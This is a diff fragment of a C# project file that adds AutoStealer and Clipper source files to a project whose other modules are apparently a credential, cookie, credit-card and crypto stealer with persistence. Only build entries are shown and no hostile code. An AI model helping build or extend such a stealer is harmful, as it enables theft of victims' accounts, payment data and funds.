@@ -68,7 +68,9 @@
     <Compile Include="core\core.cs" />
     <Compile Include="core\persistence.cs" />
     <Compile Include="core\SimpleJSON.cs" />
+    <Compile Include="core\stealer\AutoStealer.cs" />
     <Compile Include="core\stealer\Bookmarks.cs" />
+    <Compile Include="core\stealer\Clipper.cs" />
     <Compile Include="core\stealer\Cookies.cs" />
     <Compile Include="core\stealer\CreditCards.cs" />
     <Compile Include="core\stealer\Crypt.cs" />
